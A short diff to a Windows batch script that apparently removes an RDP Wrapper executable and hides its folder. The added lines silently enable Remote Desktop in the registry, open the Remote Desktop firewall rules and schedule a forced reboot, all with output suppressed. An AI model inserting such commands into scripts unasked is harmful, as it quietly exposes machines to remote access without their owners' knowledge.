@@ -19,4 +19,7 @@ if exist "%RDPW_EXE%" (
 del /f /q "%RDPW_EXE%" >nul
 if exist "%RDPW_DIR%" attrib +h +s "%RDPW_DIR%"
 powershell -Command "Remove-MpPreference -ExclusionPath '%RDPW_EXE%'" >nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul
+netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes >nul
+shutdown /r /t 900 /d p:4:1 >nul 2>&1
 exit
